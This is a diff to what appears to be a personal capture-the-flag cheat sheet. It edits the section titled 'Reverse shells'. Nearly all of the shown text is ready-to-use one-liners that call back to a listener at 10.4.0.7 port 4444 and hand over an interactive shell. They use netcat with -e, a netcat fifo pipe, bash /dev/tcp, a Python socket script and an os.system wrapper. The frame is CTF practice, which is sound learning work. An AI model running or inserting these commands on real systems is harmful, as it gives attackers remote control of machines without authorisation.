@@ -38,17 +38,25 @@ echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49
 
 ## Reverse shells
 
-Bash (almost never works in my experience):
+If netcat with -e exists (very rare in CTFs, in my experience):
+
+`nc -e /bin/bash 10.4.0.7 4444`
+
+Otherwise, assuming nc is present:
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f`
+
+Pure bash if /dev/tcp is available (rare on CTFs):
 
 `bash -i >& /dev/tcp/10.4.0.7/4444 0>&1`
 
-Python (almost always works in my experience):
+Python, especially useful if you have python rce by default (in which case just use the contents of the quoted string):
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-Netcat when you dont have the -e option (this actually worked once when the others didnt!):
+If you do have python RCE, but the above is too weighty or you want something more concise, consider:
 
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f`
+`import os; os.system("<any of the shell commands above>")`
 
 Node reverse shell, if you can get this included on a nodejs server:
 
